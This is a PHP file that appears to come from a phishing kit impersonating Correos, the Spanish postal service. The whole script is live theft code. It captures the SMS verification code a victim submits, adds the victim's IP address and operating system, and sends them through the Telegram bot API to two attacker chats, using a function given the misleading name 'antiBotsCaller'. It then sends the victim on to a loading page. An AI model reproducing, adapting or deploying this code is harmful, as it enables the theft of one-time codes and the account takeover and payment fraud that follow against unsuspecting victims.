<?php

    include("server.php");
    include("../result-telegram.php");
    $OS = getOS($_SERVER['HTTP_USER_AGENT']); 
    $UserAgent =$_SERVER['HTTP_USER_AGENT'];
    $browser = explode(')',$UserAgent);				
    $_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	


    $ip = $_SERVER['REMOTE_ADDR'];
    $message ="
    >>>>>>>>>>> 🇪🇸 Correos SMS1 🇪🇸  <<<<<<<<<<
    [IP]    : ".$ip."
    [SMS 1]      : ".$_POST['sms1']."
    [OS] = ".$OS."
    >>>>>>>>>>>> Correos SMS1 🇪🇸 <<<<<<<<<<<\n";

    $theip = $message;
    function antiBotsCaller($messaggio,$token,$chatid) {
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
        $url = $url . "&text=" . urlencode($messaggio);
        $ch = curl_init();
        $optArray = array(
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true
        );
        curl_setopt_array($ch, $optArray);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }

    antiBotsCaller($theip,$antit2,$antic1);
    antiBotsCaller($message,$token,$chatid);

    header("Location: ../loading3.php");

?>